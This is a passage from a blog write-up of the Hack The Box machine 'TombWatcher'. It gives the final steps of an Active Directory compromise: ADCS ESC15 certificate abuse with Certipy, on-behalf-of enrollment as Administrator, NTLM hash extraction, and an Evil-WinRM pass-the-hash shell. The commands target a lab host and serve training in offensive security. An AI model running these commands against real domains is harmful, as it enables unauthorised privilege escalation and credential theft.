+<span class=copy title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>git clone -b esc15-ekuwu --single-branch https://github.com/dru1d-foofus/Certipy</span></span></code></pre></div></div><p><strong>Step 1: Request Certificate Request Agent Certificate</strong></p><p>First, I requested a certificate with the <strong>Certificate Request Agent</strong> application policy:</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
+<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
+<span class=copy title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>certipy req -dc-ip 10.10.11.72 -ca <span class=s1>&#39;tombwatcher-CA-1&#39;</span> -target-ip 10.10.11.72 <span class=se>\
+</span></span></span><span class=line><span class=cl><span class=se></span>    -u cert_admin@tombwatcher.htb -p <span class=s1>&#39;NewPassword&#39;</span> <span class=se>\
+</span></span></span><span class=line><span class=cl><span class=se></span>    -template WebServer -application-policies <span class=s1>&#39;Certificate Request Agent&#39;</span></span></span></code></pre></div></div><p>This generated <code>cert_admin.pfx</code>.</p><p><strong>Step 2: Request Administrator Certificate On-Behalf-Of</strong></p><p>Using the Certificate Request Agent certificate, I requested a certificate on behalf of the Administrator:</p><p><strong>Reference:</strong> <a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2#:~:text=Enrollment%20Agent" target=_blank rel="noopener noreffer">Certificate Request Agent Abuse</a></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
+<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
+<span class=copy title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>certipy req <span class=se>\
+</span></span></span><span class=line><span class=cl><span class=se></span>    -u <span class=s1>&#39;cert_admin@tombwatcher.htb&#39;</span> -p <span class=s1>&#39;NewPassword&#39;</span> <span class=se>\
+</span></span></span><span class=line><span class=cl><span class=se></span>    -dc-ip <span class=s1>&#39;10.10.11.72&#39;</span> -target <span class=s1>&#39;DC01.tombwatcher.htb&#39;</span> <span class=se>\
+</span></span></span><span class=line><span class=cl><span class=se></span>    -ca <span class=s1>&#39;tombwatcher-CA-1&#39;</span> -template <span class=s1>&#39;User&#39;</span> <span class=se>\
+</span></span></span><span class=line><span class=cl><span class=se></span>    -pfx cert_admin.pfx -on-behalf-of <span class=s1>&#39;tombwatcher\Administrator&#39;</span></span></span></code></pre></div></div><p>This generated the final <code>administrator.pfx</code> certificate with proper Client Authentication capabilities.</p><p><strong>Step 3: Authenticate as Administrator</strong></p><p>With the valid administrator certificate, I authenticated and extracted the NTLM hash:</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
+<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
+<span class=copy title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>certipy auth -pfx <span class=s1>&#39;administrator.pfx&#39;</span> -dc-ip <span class=s1>&#39;10.10.11.72&#39;</span></span></span></code></pre></div></div><p><strong>Step 4: Pass-the-Hash to Get Root Shell</strong></p><p>Finally, I used Evil-WinRM with the extracted NTLM hash to gain a shell as Administrator:</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
+<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
+<span class=copy title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>evil-winrm -i 10.10.11.72 -u Administrator -H &lt;NTLM_HASH&gt;</span></span></code></pre></div></div><p>🎉 <strong>Root flag obtained!</strong></p><hr><h2 id=conclusion>Conclusion</h2><p><strong>TombWatcher</strong> provided an excellent deep-dive into Active Directory exploitation, showcasing:</p><ol><li><strong>Kerberoasting</strong>: Extracting and cracking service account credentials</li><li><strong>BloodHound Analysis</strong>: Visualizing complex attack paths through AD relationships</li><li><strong>Group Privilege Abuse</strong>: Leveraging AddSelf, ReadGMSAPassword, ForceChangePassword, WriteOwner</li><li><strong>DACL Manipulation</strong>: Modifying permissions to gain control over user accounts</li><li><strong>AD Object Recovery</strong>: Restoring deleted accounts for lateral movement</li><li><strong>ADCS ESC15 Exploitation</strong>: Injecting arbitrary application policies in v1 certificate templates</li><li><strong>Certificate-Based Authentication</strong>: Using certificates for privilege escalation to Domain Admin</li></ol><p>This machine emphasizes the importance of properly securing Active Directory Certificate Services, monitoring group memberships and privileges, and understanding the complex web of permissions that can lead to domain compromise.</p><hr><p><strong>Thanks for reading! Happy hacking! 🚀</strong></p></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>Updated on 2025-10-23</span></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><span><a href=javascript:void(0); title="Share on X" data-sharer=x data-url=https://fodhil-ben.github.io/f0dh1l/posts/htb_tombwatcher/ data-title='HTB Machine Writeup "TombWatcher"' data-via=Benhibafodhil data-hashtags="HTB,Windows,Active Directory"><i class="fab fa-x-twitter fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Threads" data-sharer=threads data-url=https://fodhil-ben.github.io/f0dh1l/posts/htb_tombwatcher/ data-title='HTB Machine Writeup "TombWatcher"'><i class="fab fa-threads fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Facebook" data-sharer=facebook data-url=https://fodhil-ben.github.io/f0dh1l/posts/htb_tombwatcher/ data-hashtag=HTB><i class="fab fa-facebook-square fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Hacker News" data-sharer=hackernews data-url=https://fodhil-ben.github.io/f0dh1l/posts/htb_tombwatcher/ data-title='HTB Machine Writeup "TombWatcher"'><i class="fab fa-hacker-news fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Line" data-sharer=line data-url=https://fodhil-ben.github.io/f0dh1l/posts/htb_tombwatcher/ data-title='HTB Machine Writeup "TombWatcher"'><i data-svg-src=https://cdn.jsdelivr.net/npm/simple-icons@15.14.0/icons/line.svg aria-hidden=true></i></a><a href=javascript:void(0); title="Share on 微博" data-sharer=weibo data-url=https://fodhil-ben.github.io/f0dh1l/posts/htb_tombwatcher/ data-title='HTB Machine Writeup "TombWatcher"'><i class="fab fa-weibo fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Diaspora" data-sharer=diaspora data-url=https://fodhil-ben.github.io/f0dh1l/posts/htb_tombwatcher/ data-title='HTB Machine Writeup "TombWatcher"' data-description><i class="fab fa-diaspora fa-fw" aria-hidden=true></i></a><a href="https://t.me/share/url?url=https%3a%2f%2ffodhil-ben.github.io%2ff0dh1l%2fposts%2fhtb_tombwatcher%2f&amp;text=HTB%20Machine%20Writeup%20%22TombWatcher%22" target=_blank title="Share on Telegram"><i class="fab fa-telegram fa-fw" aria-hidden=true></i></a></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw" aria-hidden=true></i>&nbsp;<a href=/f0dh1l/tags/htb/>HTB</a>,&nbsp;<a href=/f0dh1l/tags/windows/>Windows</a>,&nbsp;<a href=/f0dh1l/tags/active-directory/>Active Directory</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>Back</a></span>&nbsp;|&nbsp;<span><a href=/f0dh1l/>Home</a></span></section></div><div class=post-nav><a href=/f0dh1l/posts/htb_artificial/ class=prev rel=prev title='HTB Machine Writeup "Artificial"'><i class="fas fa-angle-left fa-fw" aria-hidden=true></i>HTB Machine Writeup "Artificial"</a></div></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line>Powered by <a href=https://gohugo.io/ target=_blank rel="noopener noreffer" title="Hugo 0.145.0">Hugo</a> | Theme - <a href=https://github.com/dillonzq/LoveIt target=_blank rel="noopener noreffer" title="LoveIt 0.3.1-DEV"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden=true></i> LoveIt</a></div><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="far fa-copyright fa-fw" aria-hidden=true></i><span itemprop=copyrightYear>2025</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/f0dh1l/ target=_blank>F0DH1L</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top"><i class="fas fa-arrow-up fa-fw" aria-hidden=true></i></a></div><div id=fixed-buttons-hidden><a href=# id=view-comments class=fixed-button title="View Comments"><i class="fas fa-comment fa-fw" aria-hidden=true></i></a></div><link rel=stylesheet href=/f0dh1l/css/custom.css><script src=https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js></script><script src=https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js></script><script src=https://cdn.jsdelivr.net/npm/sharer.js@0.5.2/sharer.min.js></script><script>window.config={comment:{}}</script><script src=/f0dh1l/js/theme.min.js></script></body></html>
